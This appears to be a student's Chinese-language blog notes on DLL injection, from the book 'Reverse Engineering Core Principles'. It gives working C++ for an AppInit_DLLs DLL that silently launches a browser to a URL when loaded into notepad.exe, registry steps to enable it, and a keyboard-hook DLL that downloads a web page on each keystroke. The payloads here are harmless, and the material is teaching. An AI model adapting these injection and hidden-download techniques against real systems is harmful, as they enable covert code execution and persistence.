+<p>这时候可以一步步调试（建议不要，会发现没个头，加载各种dll不断</p>
+<p>先通过搜索字符串，在自己要调试的地方下断点</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331161048170.png" alt="image-20220331161048170"></p>
+<p>一下F9跑到这，如果不F9说实话还会跳到各种dll</p>
+<p>然后会发现这都创建线程，关闭线程句柄了还不显示？？</p>
+<p>查一下得知，线程和线程句柄根本不是一个东西</p>
+<ol>
+<li><p> <strong>线程句柄</strong>是用来操作<strong>线程</strong>的，<strong>线程句柄</strong>是个内核对象</p>
+</li>
+<li><p> <strong>线程</strong>的生命周期就是<strong>线程函数</strong>从开始到return，<strong>线程句柄</strong>是从CreatThread到CloseHandle</p>
+</li>
+<li><p> 所有内核对象都是系统资源，用了要还的，也就是用完后一定要调用CloseHandle</p>
+</li>
+</ol>
+<p>还是很有必要学习Windows核心编程，找机会买了</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lhsxsh/article/details/3905505">CloseHandle()函数的使用</a></p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331161202571.png" alt="image-20220331161202571"></p>
+<p>再在ThreadProc线程函数下个断点</p>
+<p>会发现Injection程序的字符串都跳了，这边才跑到（这个原理可能还要更熟悉才理解</p>
+<p>然后就可以调试ThreadProc线程函数的所有操作</p>
+<p>按下最后一键！下载梓金鳌的主页！</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331161906070.png" alt="image-20220331161906070"></p>
+<p>可以解惑刚刚想看的参数，如g_hMod为当前dll的基地址</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetModuleFileName</span>(g_hMod, szPath, MAX_PATH))</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331163136043.png" alt="image-20220331163136043"></p>
+<p>后续等等已经确定</p>
+<p>（今天天气有丝寒冷，好久没有沉浸在审计和调试之中）</p>
+<h1 id="0x02-AppInit-DLLs"><a href="#0x02-AppInit-DLLs" class="headerlink" title="0x02 AppInit_DLLs"></a>0x02 AppInit_DLLs</h1><p>wsprintf(缓冲区,格式，要格式化的值)</p>
+<p>简单审计一下，嘛，已经习惯了</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myhack2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_CMD  <span class="meta-string">L&quot;c:\\Program Files\\Internet Explorer\\iexplore.exe&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_ADDR <span class="meta-string">L&quot;http://bayunhong.top/&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_DST_PROC <span class="meta-string">L&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR szCmd[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    TCHAR szPath[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    TCHAR* p = <span class="literal">NULL</span>;</span><br><span class="line">    STARTUPINFO si = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line">    si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(STARTUPINFO);</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// 获取当前前程的名称</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, szPath, MAX_PATH))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>)))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tcsicmp(p + <span class="number">1</span>, DEF_DST_PROC))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将CMD和ADDR格式化放入szCmd</span></span><br><span class="line">        <span class="comment">// 再通过CreateProcess执行</span></span><br><span class="line">        <span class="built_in">wsprintf</span>(szCmd, <span class="string">L&quot;%s %s&quot;</span>, DEF_CMD, DEF_ADDR);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, (LPTSTR)(LPCTSTR)szCmd,</span><br><span class="line">            <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">            NORMAL_PRIORITY_CLASS,</span><br><span class="line">            <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pi.hProcess != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打开注册表</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331172459526.png" alt="image-20220331172459526"></p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331172618411.png" alt="image-20220331172618411"></p>
+<p>修改AppInit_DLLS，写入要加载的DLL</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331172705161.png" alt="image-20220331172705161"></p>
+<p>修改LoadAppInit_DLLs，0为不执行，1为执行</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331172744120.png" alt="image-20220331172744120"></p>
+<p>再重启即可发现</p>
+<p>注进去咯！</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331172840889.png" alt="image-20220331172840889"></p>
+<h1 id="0x03-SetWindowsHookEx"><a href="#0x03-SetWindowsHookEx" class="headerlink" title="0x03 SetWindowsHookEx()"></a>0x03 SetWindowsHookEx()</h1><p>与之前钩子同理，就是这次不是直接返回1（截获消息不输出），这次有消息就调用下载文件，呜呼！</p>
+<p>新增的命令</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="comment">// Unicode编码时，tchar为uchar（双字符）；ANSI编码时，tchar为char</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;UrlMon.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_URL     	(<span class="meta-string">L&quot;http://bayunhong.top/&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_FILE_NAME   (<span class="meta-string">L&quot;index.html&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Bool WINAPI <span class="title">DllMain</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">		g_hMod = (HMODULE)hinstDLL;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接编译即可！</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myhack2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="comment">// Unicode编码时，tchar为uchar（双字符）；ANSI编码时，tchar为char</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;UrlMon.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROCESS_NAME		<span class="meta-string">&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_URL     	(<span class="meta-string">L&quot;http://bayunhong.top/&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_FILE_NAME   (<span class="meta-string">L&quot;index.html&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载卸载dll都要先执行DllMain</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	g_hMod = (HMODULE)hinstDLL;</span><br><span class="line"></span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (dwReason)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 加载时</span></span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		<span class="comment">// 该值是DLL的基地址</span></span><br><span class="line">		g_hInstance = hinstDLL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 卸载时</span></span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 在调用HookStart时，SetWindowsHookEx就会将KeyboardProc添加到钩链，安装好钩子，无论哪个进程，只要发生键盘输入事件，OS就强制把KeyHook.dll注入相应进程</span></span><br><span class="line"><span class="comment">// 2. 发生键盘事件，就会首先调用执行KeyHook.KeyboardProc()</span></span><br><span class="line"><span class="comment">// 3. KeyboardProc函数中发生输入事件，就会比较当前进程是否是Notepad.exe</span></span><br><span class="line"><span class="comment">// 4. 如果是就直接返回1，终于该函数，这意味着截获且删除消息（这样键盘消息就不会传递到notepad.exe程序的相关队列）</span></span><br><span class="line"><span class="comment">// 5. 如果不是notepad就执行CallNextHookEx，这意味着消息会被传递到另一个程序或者钩链的另一个钩子</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line">	<span class="keyword">char</span>* p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line">		<span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>)) <span class="comment">// 释放按键时</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">			p = <span class="built_in">strrchr</span>(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// p + 1代表找到 \\后的第一位</span></span><br><span class="line">			<span class="keyword">if</span> (!_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME))</span><br><span class="line">			&#123;</span><br><span class="line">				TCHAR szPath[_MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 获取当前进程已加载模块的文件的完整路径（这边就是把dll的文件所在的路径放到了szPath）</span></span><br><span class="line">				<span class="keyword">if</span> (!<span class="built_in">GetModuleFileName</span>(g_hMod, szPath, MAX_PATH))</span><br><span class="line">					<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 查找字符串中某个字符最后一次出现的位置（找到了C:\\LINKSTART\\myhack.dll）</span></span><br><span class="line">				TCHAR* p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">				<span class="keyword">if</span> (!p)</span><br><span class="line">					<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// _tcscpy_s：字符拷贝函数，若是UNICODE编码则采用wcscpy_s()函数，若是多字节编码则采用strcpy_s()函数</span></span><br><span class="line">				<span class="comment">// 这边就是把C:\\LINKSTART\\myhack.dll换成了C:\\LINKSTART\\index.html</span></span><br><span class="line">				_tcscpy_s(p + <span class="number">1</span>, _MAX_PATH, DEF_FILE_NAME);</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 从指定URL下载到指定路径</span></span><br><span class="line">				<span class="built_in">URLDownloadToFile</span>(<span class="literal">NULL</span>, DEF_URL, szPath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//				return 0;</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">// declspec为导出函数关键字</span></span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		g_hHook = <span class="built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (g_hHook)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">			g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p>只要在键盘一输入，就会下载指定网页！</p>
+<p><img src="/2022/03/30/%E5%85%B3%E4%BA%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-DLL%E6%B3%A8%E5%85%A5/image-20220331191155789.png" alt="image-20220331191155789"></p>
+
+    </div>
+
+    <p style= "text-align:center">
+        让我看看我被读了 <b><span
+            id="/2022/03/30/关于逆向工程核心原理-DLL注入/"
+            class="waline-visitor-count"
+          />...</b> 次呢🎉</p>
+    
+
+    <div class="about">
+        <h1>About this Post</h1>
+        <p>This post is written by P.Z, licensed under <a
+                target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    <!-- 
+        
+     -->
+<div class="container">
+<div id="waline"></div>
+  <script>
+    Waline({
+      el: '#waline',
+      serverURL: 'https://blog-api-5rvxh62nz-pozeep.vercel.app/',  
+      visitor: true,
+      emoji: [   //这里加了一些表情 
+        'https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/weibo',
+        'https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili',
+        'https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/qq',
+        'https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/tieba',
+      ],
+       avatar: 'robohash',   //自定义默认头像为随机的机器人
+       placeholder: '评论什么好呢',   //占位符
+    });
+  </script>
+</div>
+
+<!-- <span id="/2022/03/30/关于逆向工程核心原理-DLL注入/" class="leancloud_visitors" data-flag-title="关于逆向工程核心原理-DLL注入">
+    <em class="post-meta-item-text">阅读量 </em>
+    <i class="waline-visitor-count"></i>
+</span> -->
+
+</article>
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h4 class="title">Blog</h4>
+                
+                <a href="/" class="item">Home</a>
+                
+                <a href="/Diary/Diary.html" class="item">Diary</a>
+                
+                <a href="/Friends/Friends.html" class="item">Friends</a>
+                
+                <a href="/CTF/CTF.html" class="item">CTF</a>
+                
+                <a href="/Book/Book.html" class="item">Book</a>
+                
+            </div>
+            
+            <div class="group">
+                <h4 class="title">Me</h4>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/PoZeep" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://space.bilibili.com/39892350" class="item">BiliBili</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2022 P.Z<br >Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+        
+    <span id="sitetime" style="text-align: center;display:block;"></span>
+
+
+</footer>
+
+<script language=javascript>
+    function siteTime() {
+        window.setTimeout("siteTime()", 1000);
+        var seconds = 1000;
+        var minutes = seconds * 60;
+        var hours = minutes * 60;
+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+        var t1 = Date.UTC(2021, 12, 27, 12, 00, 00); //北京时间2018-2-13 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "我已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+    }/*因为建站时间还没有一年，就将之注释掉了*/
+    siteTime();
+</script>
+
+<!-- 在线通讯Tidio -->
+
+<script src="//code.tidio.co/zmdcv08a6racnaer2so7xybdwby41fsa.js"></script>
+
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+    </body>
+</html>
